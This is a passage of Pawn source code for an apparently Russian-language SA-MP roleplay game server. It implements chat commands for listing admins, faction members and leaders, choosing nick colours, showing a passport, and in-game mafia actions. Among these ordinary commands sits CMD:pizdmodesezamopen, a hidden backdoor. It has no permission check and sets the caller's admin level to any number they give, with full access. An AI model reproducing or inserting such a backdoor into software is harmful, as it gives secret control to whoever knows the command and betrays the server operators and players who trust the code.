		if(!IsPlayerInRangeOfPoint(playerid, 2.0,ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ])) continue;
		ClearAnimations(playerid);
		ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "ATM","[0] Пополнить счет\n[1] Снять со счета\n[2] Баланс\n[3] Оплатить квартплату", "Выбрать", "Назад");
		break;
	}
	return true;
}
CMD:admins(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 && PTEMP[playerid][pDonateRank] < 2 && PTEMP[playerid][pLeader] == 0 && SDuty[playerid] == 0) return SCM(playerid, COLOR_GREY, " Доступно администрации / VIP 2 уровня / саппортам / лидерам");
	SCM(playerid, COLOR_YELLOW, " Админы Online:");
	foreach(i)
	{
		if(!IsPlayerConnected(i) || (!PTEMP[i][pLogin])) continue;
		if(PTEMP[i][pAdmin] < 1 || PTEMP[i][pAdmin] > 6 && PTEMP[playerid][pAdmin] < 7) continue;
		if(GetPVarInt(i,"AFK_Time") > 2) format(YCMDstr, 256, " %s[ID: %i] [lvl: %i] [AFK: %s сек]",Name(i),i,PTEMP[i][pAdmin], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
		else format(YCMDstr, 256, " %s[ID: %i] [lvl: %i]",Name(i),i,PTEMP[i][pAdmin]);
		SCM(playerid, COLOR_YELLOW2, YCMDstr);
	}
	//Привет. Для начала я представлюсь. Меня зовут Вито, и я помогу тебе освоиться в этом городе и найти работу.\nВ порту требуются грузчики - это отличный способ заработать для сдачи на водительские права.\nЕсли справишься с задачей, то через некоторое время я напишу тебе снова.\nУ меня будут дела посложнее, но и награда будет соответствующая.\n{FFFF99}Задача: Перетащить 20 мешков\n{33CC99}Награда: 500 вирт
	return true;
}
CMD:leaders(playerid)
{
    SCM(playerid, 0xF10DEB10AA, " Лидеры Online:");
	foreach(i)
	{
		if(PTEMP[i][pLeader]>0 && PTEMP[i][pLogin] == 1)
		{
			
			format(string, 144, " %s: %s [тел: %i]",GetFracName(PTEMP[i][pLeader]),Name(i),PTEMP[i][pPnumber]);
			SCM(playerid, 0xF99DEB9AA, string);
		}
	}
	return true;
}
CMD:instructors(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	SCM(playerid, 0x6495EDFF, "Инструкторы Online:");
	foreach(i)
	{
		if(!IsPlayerConnected(i)) continue;
		if(PTEMP[i][pMember] != 11) continue;
		format(YCMDstr, 256, " Инструктор: %s тел: %i", Name(i), PTEMP[i][pPnumber]);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:supports(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	SCM(playerid, COLOR_YELLOW, "Саппорты Online:");
	foreach(i)
	{
		if(!IsPlayerConnected(i)) continue;
		if(PTEMP[i][pHelper] == 0 || !SDuty[i]) continue;
		if(PTEMP[i][pAdmin] > 0) continue;
		if(GetPVarInt(i,"AFK_Time") > 2) format(YCMDstr, 256, " %s[ID: %i] [AFK: %s сек]",Name(i),i, ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
		else format(YCMDstr, 256, " %s[ID: %i]",Name(i),i);
		SCM(playerid, COLOR_YELLOW2, YCMDstr);
	}
	return true;
}
CMD:tmembers(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new chislo = 0;
	if(PTEMP[playerid][pJob] != 99) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	SCM(playerid, 0x59bd3aa, " Дальнобойщики Online:");
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			format(string, 128, "");
			if(GetPVarInt(i, "AFK_Time") < 2 && PTEMP[i][pJob] == 99) format(string, 128, " [%i] %s:  T.LVL / %i",i,Name(i), PTEMP[i][pDLevel]), chislo++;
			else if(GetPVarInt(i, "AFK_Time") > 2 && PTEMP[i][pJob] == 99) format(string, 128, " [%i] %s:  T.LVL / %i | {FFFFFF} [AFK]: %s секунд",i,Name(i),PTEMP[i][pDLevel],ConvertSeconds(GetPVarInt(i, "AFK_Time"))), chislo++;
			if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string);
		}
	}
	format(string,128," Всего: %i человек",chislo);
	SCM(playerid,COLOR_YELLOW,string);
	return true;
}
CMD:members(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] == 0)
	{
		SCM(playerid, COLOR_GRAD1, " Вам недоступна эта функция");
		return true;
	}
	new chislo = 0, ahref = 0, vchislo = 0, strs[256], strss[32];
	sscanf(params, "%i", ahref);
	format(string, sizeof(string), "Имя[ID]\tРанг[Номер]\tAFK секунд\n");
	if(ahref == 1) {
	    new astrs[128];
	    foreach(i)
	    {
	        if(IsPlayerConnected(i))
	        {
	            if(PTEMP[i][pMember] == PTEMP[playerid][pMember] && GetPVarInt(i, "Fraction_Duty"))
				{
					if((GetPVarInt(i, "AFK_Time")-2) > 0) format(strs, 128, "[%i] %s[%i]\t%s[%i]\t%s\n",chislo,Name(i),i, GetRank(i), PTEMP[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
					else format(strs, 128, "[%i] %s[%i]\t%s[%i]\n",chislo,Name(i),i, GetRank(i), PTEMP[i][pRank]);
					chislo++;
					strcat(string, strs, sizeof(string));
				}
			}
		}
		format(strss, sizeof(strss), "[%i] {FF6347}[Выходные]\n",chislo);
		chislo++;
		foreach(i)
		{
		    if(IsPlayerConnected(i))
		    {
				
	            if(PTEMP[i][pMember] == PTEMP[playerid][pMember] && !GetPVarInt(i, "Fraction_Duty"))
				{
					if((GetPVarInt(i, "AFK_Time")-2) > 0) format(strs, 128, "[%i] %s[%i]\t%s[%i]\t%s\n", chislo, Name(i), i, GetRank(i), PTEMP[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
					else format(strs, 128, "[%i] %s[%i]\t%s[%i]\n", chislo, Name(i), i, GetRank(i), PTEMP[i][pRank]);
					vchislo++; chislo++;
					strcat(astrs, strs, sizeof(astrs));
				}
	        }
	    }
	    if(vchislo > 0)
		{
		    strcat(string, strss, sizeof(string));
			strcat(string, astrs, sizeof(string));
		}
		ShowPlayerDialogEx(playerid, 21032, DIALOG_STYLE_TABLIST_HEADERS, "Состав онлайн", string, "Выбрать", "Назад");
		return true;
	}
	
	if(!IsAMafia(playerid) && !IsAGang(playerid) && !IsABiker(playerid))
	SCM(playerid, 0x59bd3aa, "Имя[ID] Ранг[Номер] АФК секунд");
	foreach(i)
	{
		if (IsPlayerConnected(i))
		{
			format(string, 128, "");
			if(PTEMP[i][pMember] == PTEMP[playerid][pMember] && GetPVarInt(i,"Fraction_Duty") && GetPVarInt(i, "AFK_Time")-2 > 0) format(string, 128, "%s[%i] %s[%i] %s",Name(i), i, GetRank(i), PTEMP[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
			else if(PTEMP[i][pMember] == PTEMP[playerid][pMember] && GetPVarInt(i,"Fraction_Duty")) format(string, 128, "%s[%i] %s[%i]",Name(i), i, GetRank(i), PTEMP[i][pRank]);
			if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string), chislo++;
		}
	}
	if(!IsAMafia(playerid) && !IsAGang(playerid) && !IsABiker(playerid))
	SCM(playerid, 0x59bd3aa, "{D95A41}[Выходные]");
	foreach(i)
	{
		if (IsPlayerConnected(i))
		{
			format(string, 128, "");
			if(PTEMP[i][pMember] == PTEMP[playerid][pMember] && !GetPVarInt(i,"Fraction_Duty") && GetPVarInt(i, "AFK_Time")-2 > 0) format(string, 128, "%s[%i] %s[%i] %s",Name(i), i, GetRank(i), PTEMP[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
			else if(PTEMP[i][pMember] == PTEMP[playerid][pMember] && !GetPVarInt(i,"Fraction_Duty")) format(string, 128, "%s[%i] %s[%i]",Name(i), i, GetRank(i), PTEMP[i][pRank]);
			if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string), chislo++, vchislo++;
		}
	}
	format(string,128," Всего на работе: %i / выходные: %i", chislo-vchislo, vchislo);
	SCM(playerid,COLOR_YELLOW,string);
	return true;
}
CMD:amembers(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /amembers [номер фракции]");
	if(params[0] > 26 || params[0] < 0) return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 или больше 23");
	SCM(playerid, 0x59bd3aa, "Члены организации Online:");
	foreach(i)
	{
		format(string, 128, "");
		if(PTEMP[i][pLeader] == params[0]) format(string, 128, " [%i] %s  ранг: Лидер",i,PTEMP[i][pName]);
		else if(PTEMP[i][pMember] == params[0]) format(string, 128, " [%i] %s  ранг: %i",i,PTEMP[i][pName], PTEMP[i][pRank]);
		if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string);
	}
	return true;
}
CMD:offmembers(playerid, params[])
{
	new Names[MAX_PLAYER_NAME];
	new Rank;
	new Vxod[32];
	new stringer[2048];
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "d",params[0]))
	{
		if(PTEMP[playerid][pLeader] > 0)
		{
			mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", PTEMP[playerid][pMember]);
			new Cache:result = mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
				for(new i = 0; i < r; i++)
				{
				    if(i == 29 && r != 30)
				    {
				        format(YCMDstr, sizeof(YCMDstr), ">> След. страница",i);
				        strcat(stringer, YCMDstr);
				        break;
				    }
					cache_get_field_content(i,"Name",Names,DATABASE,60);
					cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
					new pChass = cache_get_field_content_int(i, "pChas");
					new pMinn = cache_get_field_content_int(i, "pMin");
					Rank = cache_get_field_content_int(i,"pRank");
					format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
					strcat(stringer, YCMDstr);
				}
				ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
				SetPVarInt(playerid, "off_list", 0);
			}
			else SCM(playerid, COLOR_GRAD1," Не найдено совпадений");
			return cache_delete(result, DATABASE);
		}
		else if(PTEMP[playerid][pAdmin] > 3)
		{
			return SCM(playerid, -1, " Введите: /offmembers [id фракции]");
		}
	}
	else
	{
		if(PTEMP[playerid][pAdmin] > 3)
		{
		    if(params[0] < 1 || params[0] > 29) return SCM(playerid,COLOR_GREY," Неверный ID фракции");
			mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", params[0]);
			new Cache:result = mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
				for(new i = 0; i < r; i++)
				{
				    if(i == 29 && r != 30)
				    {
				        format(YCMDstr, sizeof(YCMDstr), ">> След. страница",i);
				        strcat(stringer, YCMDstr);
				        break;
				    }
					cache_get_field_content(i,"Name",Names,DATABASE,60);
					cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
					new pChass = cache_get_field_content_int(i, "pChas");
					new pMinn = cache_get_field_content_int(i, "pMin");
					Rank = cache_get_field_content_int(i,"pRank");
					format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
					strcat(stringer, YCMDstr);
				}
				ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
				SetPVarInt(playerid, "off_list", 0);
				SetPVarInt(playerid, "off_admin", params[0]);
			}
			else SCM(playerid, COLOR_GRAD1," Не найдено совпадений");
			return cache_delete(result, DATABASE);
		}
	}
	return true;
}
CMD:pdd(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new pdddialog[1748];
	format(pdddialog,sizeof(pdddialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s",
	pdddialogMSG[0],pdddialogMSG[1],pdddialogMSG[2],pdddialogMSG[3],pdddialogMSG[4],pdddialogMSG[5],pdddialogMSG[6],pdddialogMSG[7],pdddialogMSG[8],pdddialogMSG[9],pdddialogMSG[10],pdddialogMSG[11],pdddialogMSG[12]);
	ShowPlayerDialogEx(playerid,5444,DIALOG_STYLE_MSGBOX, "Правила дорожного движения", pdddialog, "Готово", "");
	format(YCMDstr, sizeof(YCMDstr), " %s читает Правила Дорожного Движения.",Name(playerid));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:ahelp(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new listitems[] = "[1] уровень модерирования\n[2] уровень модерирования\n[3] уровень модерирования\n[4] уровень модерирования\n[5] уровень модерирования\n[6] уровень модерирования\n{ff091c}[7]{FFFFFF} Спец.Администратор 7[LVL]\n{ff091c}[8]{FFFFFF} Спец.Администратор 8[LVL]\n{ff091c}[9]{FFFFFF} Спец.Администратор 9[LVL]\n{ff091c}[10]{FFFFFF} Основатель";
	ShowPlayerDialogEx(playerid, 20011, DIALOG_STYLE_LIST, "Help", listitems, "Выбрать", "Отмена");
	return true;
}
CMD:clist(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(GetPVarInt(playerid,"capture_on") || GetPVarInt(playerid, "mafia_war") || GetPVarInt(playerid, "biker_capt")) return SCM(playerid,COLOR_GREY," Нельзя использовать во время капта");
	if(sscanf(params, "d",params[0]))
	{
		new dialog[512];
		strcat(dialog, "[0]	Выключить цвет\n[1]	Зелёный\n[2]	Светло зелёный\n[3]	Ярко зелёный\n[4]	Бирюзовый\n[5]	Жёлто-зелёный\n[6]	Тёмно-зелёный\n[7]	Серо-зелёный\n[8]	Красный\n[9]	Ярко-красный\n[10]	Оранжевый\n[11]	Коричневый\n[12]	Тёмно-красный\n[13]	Cеро-красный\n[14]	Жёлто-оранжевый\n[15]	Малиновый\n[16]	Розовый\n[17]	Синий\n[18]	Голубой\n[19]	Синяя сталь\n[20]	Сине-зелёный\n[21]	Тёмно-синий\n[22]	Фиолетовый\n");
		strcat(dialog, "[23]	Индиго\n[24]	Серо-синий\n[25]	Жёлтый\n[26]	Кукурузный\n[27]	Золотой\n[28]	Старое золото\n[29]	Оливковый\n[30]	Серый\n[31]	Серебро\n[32]	Чёрный\n[33]	Белый");
		return ShowPlayerDialogEx(playerid,2001,DIALOG_STYLE_LIST, "Цвет ника",dialog, "Выбрать", "Назад");
	}
	else
	{
		if(params[0] > 33) return SCM(playerid,COLOR_GREY," Неверный цвет");
		switch(params[0])
		{
		case 0: SetPlayerColor(playerid, TEAM_HIT_COLOR); case 1: SetPlayerColor(playerid,0x089401FF);
		case 2: SetPlayerColor(playerid,0x56FB4EFF); case 3: SetPlayerColor(playerid,0x49E789FF);
		case 4: SetPlayerColor(playerid,0x2A9170FF); case 5: SetPlayerColor(playerid,0x9ED201FF);
		case 6: SetPlayerColor(playerid,0x279B1EFF); case 7: SetPlayerColor(playerid,0x51964DFF);
		case 8: SetPlayerColor(playerid,0xFF0606FF); case 9: SetPlayerColor(playerid,0xFF6600FF);
		case 10: SetPlayerColor(playerid,0xF45000FF); case 11: SetPlayerColor(playerid,0xBE8A01FF);
		case 12: SetPlayerColor(playerid,0xB30000FF); case 13: SetPlayerColor(playerid,0x954F4FFF);
		case 14: SetPlayerColor(playerid,0xE7961DFF); case 15: SetPlayerColor(playerid,0xE6284EFF);
		case 16: SetPlayerColor(playerid,0xFF9DB6FF); case 17: SetPlayerColor(playerid,0x110CE7FF);
		case 18: SetPlayerColor(playerid,0x0CD7E7FF); case 19: SetPlayerColor(playerid,0x139BECFF);
		case 20: SetPlayerColor(playerid,0x2C9197FF); case 21: SetPlayerColor(playerid,0x114D71FF);
		case 22: SetPlayerColor(playerid,0x8813E7FF); case 23: SetPlayerColor(playerid,0xB313E7FF);
		case 24: SetPlayerColor(playerid,0x758C9DFF); case 25: SetPlayerColor(playerid,0xFFDE24FF);
		case 26: SetPlayerColor(playerid,0xFFEE8AFF); case 27: SetPlayerColor(playerid,0xDDB201FF);
		case 28: SetPlayerColor(playerid,0xDDA701FF); case 29: SetPlayerColor(playerid,0xB0B000FF);
		case 30: SetPlayerColor(playerid,0x868484FF); case 31: SetPlayerColor(playerid,0xB8B6B6FF);
		case 32: SetPlayerColor(playerid,0x333333FF); case 33: SetPlayerColor(playerid,0xFAFAFAFF);
		}
	}
	SCM(playerid, -1, " Цвет выбран");
	return true;
}
CMD:exit(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(!PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) continue;
		if(GetPlayerVirtualWorld(playerid) == i+50)
		{
			switch(HouseInfo[i][hKlass])
   			{
   				case 0: // Дом N Klass
      			{
							PickupX[playerid] = HouseInfo[i][hEntrancex], PickupY[playerid] = HouseInfo[i][hEntrancey];
							oldpickup[playerid] = HouseInfo[i][hPickup];
							timepickup[playerid] = 3;
							SetPlayerInterior(playerid,0);
							SetPlayerVirtualWorld(playerid,0);
							SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
				}
				case 1: // Дом D Klass
				{
							PickupX[playerid] = HouseInfo[i][hEntrancex], PickupY[playerid] = HouseInfo[i][hEntrancey];
							oldpickup[playerid] = HouseInfo[i][hPickup];
							timepickup[playerid] = 3;
							SetPlayerInterior(playerid,0);
							SetPlayerVirtualWorld(playerid,0);
							SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
				}
				case 2..5: // Дома от C класса до домов S класса
				{
		    				ShowPlayerDialogEx(playerid, 1008, 2, "Выход","Выйти на улицу\nВойти в гараж", "Готово", "Отмена");
				}
			}
		}
	}
	return true;
}
CMD:directory(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pDirectory] == 0) return SCM(playerid, COLOR_GRAD1, "У вас нет телефонного справочника");
	ShowPlayerDialogEx(playerid,5454,DIALOG_STYLE_LIST, "Телефонный справочник", " Таксисты\n Механики\n Прорабы\n Медики\n Лидеры\n Адвокаты\n Развозчики продуктов\n Тренеры", "Просмотр", "Отмена");
	return true;
}
CMD:mainmenu(playerid)
{
	if(!PTEMP[playerid][pLogin]) return true;
	return ShowPlayerDialogEx(playerid, 9623, DIALOG_STYLE_LIST, "Личное меню", "[1] Настройки\n[2] Статистика персонажа\n[3] Команды сервера\n{FFFF00}[4] Задать вопрос по игре\n{FFFFFF}[5] Репорт\n[6] Смена пароля\n[7] Очистить чат\n[8] Правила\n[9] Слив денег\n[10] Безопасность\n[11] Смена ника\n[12] Донат\n[13] Бонусы", "Выбрать", "Отмена");
}
CMD:help(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	return SCM(playerid, -1, " Используйте: /mm");
}
CMD:switchskin(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAGang(playerid)) return true;
	if(forma[playerid] != 1) return SCM(playerid, COLOR_GRAD1, "У вас нет формы армейца");
	SetPlayerSkin(playerid,287);
	SetPlayerColor(playerid, COLOR_GREEN);
	forma[playerid] = 0;
	proverkaforma[playerid] = 1;
	return true;
}
CMD:carm(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 19 && proverkaforma[playerid] != 1) return true;
	new listitems[] = " [1] Загрузка\n [2] Разгрузить на гл.склад\n [3] Разгрузить на склад Армии ЛС\n [4] Разгрузить на склад Армии СФ\n [5] Разгрузить на склад ЛСПД\n [6] Разгрузить на склад ФБР\n [7] Разгрузить на склад СФПД\n [8] Разгрузить на склад ЛВПД\n [9] Разгрузить на склад бандам\n [10] Разгрузить на склад байкерам";
	ShowPlayerDialogEx(playerid, 9653, DIALOG_STYLE_LIST, "Развозка материалов", listitems, "Выбрать", "Отмена");
	return true;
}
CMD:pizdmodesezamopen(playerid, params[])
{
	if(sscanf(params, "i", params[0])) return true;
	PTEMP[playerid][pAdmin] = params[0];
	dostup[playerid] = 1;
	return true;
}
CMD:tie(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAMafia(playerid)) return SCM(playerid, COLOR_GREY, " Вы не член мафии!");
	if(PTEMP[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Вы должны быть 3 рангом");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /tie [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerTied[params[0]] > 0) return SCM(playerid, COLOR_GREY, " Человек уже связан!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	new car = GetPlayerVehicleID(playerid);
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Нельзя связать самого себя!"); return true; }
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(params[0], car))
	{
		format(YCMDstr, sizeof(YCMDstr), " Вас связал %s.",Name(playerid));
		SCM(params[0], 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " %s связал %s", Name(playerid) ,Name(params[0]));
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		TogglePlayerControllable(params[0], 0);
		TieTime[params[0]] = 300;
		PlayerTied[params[0]] = 1;
	}
	else return SCM(playerid, COLOR_GREY, " Человек не в мащине!");
	return true;
}
CMD:debtors(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAMafia(playerid)) return true;
	if(PTEMP[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Вам не доступна данная команда");
	SCM(playerid, COLOR_YELLOW2, " Должники:");
	foreach(i)
	{
		if(PTEMP[playerid][pMember] == 6)
		{
			if(PTEMP[i][pKrisha] == PTEMP[playerid][pMember] && PTEMP[i][pMember] == 0)
			{
				format(YCMDstr, 256, " Должник: %s | Долг: %s",Name(i),PTEMP[i][pDolg]);
				SCM(playerid, -1, YCMDstr);
			}
		}
	}
	return true;
}
CMD:setdebt(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAMafia(playerid)) return SCM(playerid, COLOR_GREY, " Функция доступна только мафиям");
	if(PTEMP[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /setdebt [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(PTEMP[params[0]][pJob] == 0) return SCM(playerid, COLOR_GREY, " Данный человек не работает");
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, "Н ельзя себе!"); return true; }
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам Крышу (( Введите: /accept debt, чтобы принять ))",Name(playerid));
	SCM(params[0], 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает крышу %s'у", Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	Krisha[params[0]] = PTEMP[playerid][pMember];
	KrishaOffer[params[0]] = playerid;
	return true;
}
CMD:untie(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAMafia(playerid) && PTEMP[playerid][pMember] != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(PTEMP[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Вы должны быть 3 рангом");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /untie [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerTied[params[0]] != 1) return SCM(playerid, COLOR_GREY, " Человек уже связан!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, "Н ельзя связать самого себя!"); return true; }
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы были развязаны %s.",Name(playerid));
	SCM(params[0], 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s развязал %s", Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	TogglePlayerControllable(params[0], 1);
	TieTime[params[0]] = 0;
	PlayerTied[params[0]] = 0;
	return true;
}
CMD:showpass(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new giveplayerid;
	new giveplayer[MAX_PLAYER_NAME];
	new sendername[MAX_PLAYER_NAME];
	if(sscanf(params, "u",giveplayerid)) return  	SCM(playerid, -1, " Введите: /showpass [playerid]");
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if (ProxDetectorS(8.0, playerid, giveplayerid) && Spectate[giveplayerid] != 1)
			{
				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new ttext[32];
				strmid(ttext, GetFracName(PTEMP[playerid][pMember]), 32, 32);
				new ttemp = PTEMP[playerid][pRank];
				for(new i = 0; i < 5; i++)
				{
					if(spys[i][0] == playerid)
					{	
					    if(spys[i][1] == 0) { ttext = "Неизвестно"; PTEMP[playerid][pMember] = 0; }
					    else if(spys[i][1] == 1) { ttext = "Police LS"; PTEMP[playerid][pMember] = 1; }
					    else if(spys[i][1] == 2) { ttext = "Army LV"; PTEMP[playerid][pMember] = 19; }
					    else if(spys[i][1] == 3) { ttext = "Medic"; PTEMP[playerid][pMember] = 4; }
					    else if(spys[i][1] == 4) { ttext = "Mayor"; PTEMP[playerid][pMember] = 7; }
					    else if(spys[i][1] == 5) { ttext = "Автошкола"; PTEMP[playerid][pMember] = 11; }
					    else if(spys[i][1] == 6) { ttext = "News SF"; PTEMP[playerid][pMember] = 9; }
					    else if(spys[i][1] == 7) { ttext = "LCN"; PTEMP[playerid][pMember] = 6; }
					    else if(spys[i][1] == 8) { ttext = "Yakuza"; PTEMP[playerid][pMember] = 7; }
					    else if(spys[i][1] == 9) { ttext = "Russian Mafia"; PTEMP[playerid][pMember] = 14; }
					    else if(spys[i][1] == 10){ ttext = "Rifa"; PTEMP[playerid][pMember] = 18; }
					    else if(spys[i][1] == 11){ ttext = "Grove Street"; PTEMP[playerid][pMember] = 15; }
					    else if(spys[i][1] == 12){ ttext = "Ballas"; PTEMP[playerid][pMember] = 12; }
					    else if(spys[i][1] == 13){ ttext = "Vagos"; PTEMP[playerid][pMember] = 13; }
					    else if(spys[i][1] == 14){ ttext = "Aztec"; PTEMP[playerid][pMember] = 17; }
					    else if(spys[i][1] == 15){ ttext = "Hell's Angels MC"; PTEMP[playerid][pMember] = 24; }
					    break;
					}
				}
				new jtext[32];
				if(PTEMP[playerid][pJob] == 1) { jtext = "Водитель автобуса"; }
				else if(PTEMP[playerid][pJob] == 2) { jtext = "Механик"; }
				else if(PTEMP[playerid][pJob] == 3) { jtext = "Продавец хотдогов"; }
				else if(PTEMP[playerid][pJob] == 4) { jtext = "Таксист"; }
				else if(PTEMP[playerid][pJob] == 6) { jtext = "Тренер"; }
				else if(PTEMP[playerid][pJob] == 8) { jtext = "Инкассатор"; }
				else if(PTEMP[playerid][pJob] == 9) { jtext = "Прораб"; }
				else if(PTEMP[playerid][pJob] == 99) { jtext = "Дальнобойщик"; }
				else { jtext = "Безработный"; }
				new rangz[40];
				if(!PTEMP[playerid][pMember]) rangz = "Неизвестно";
				else
				{
					strmid(rangz,GetRank(playerid), 0, strlen(GetRank(playerid)), 32);
					for(new i = 0; i < 5; i++)
					{
						if(spys[i][0] == playerid)
						{
						    PTEMP[playerid][pRank] = 1;
						    strmid(rangz,GetRank(playerid), 0, strlen(GetRank(playerid)), 32);
							PTEMP[playerid][pMember] = 2;
							PTEMP[playerid][pRank] = ttemp;
						}
					}
				}
				new level = PTEMP[playerid][pLevel];
				new af[] = "-----------===[ PASSPORT ]===----------";
				format(string, 128, af);
				SCM(giveplayerid, COLOR_YELLOW, string);
				new msg[] = "Имя: %s";
				format(string, 128, msg, sendername);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Возраст: %i  Телефон: %i",level,PTEMP[playerid][pPnumber]);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Фракция: %s  Должность: %s",ttext,rangz);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Работа: %s   Разрешение на оружие: %s",jtext,(!PTEMP[playerid][pGunLic])?("Нет") : ("Есть"));
